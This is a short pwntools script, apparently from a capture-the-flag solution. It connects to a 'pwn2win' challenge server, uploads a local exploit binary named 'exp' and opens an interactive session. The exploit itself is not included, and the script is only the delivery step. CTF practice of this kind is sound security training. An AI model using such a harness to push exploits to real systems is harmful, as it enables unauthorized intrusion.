from pwn import *
import os

HOST = "baby-writeonly-password-manager.pwn2win.party"
PORT = 1337

io = remote(HOST, PORT)

io.recvuntil("Hello there. Send me your ELF")

file_size = os.path.getsize('./exp')
io.sendlineafter("30000)", f"{file_size}")

io.recvuntil("Send 'em!")

print("Sending")

with open("./exp", "rb") as f:
    data = f.read()
    io.send(data)

io.interactive()
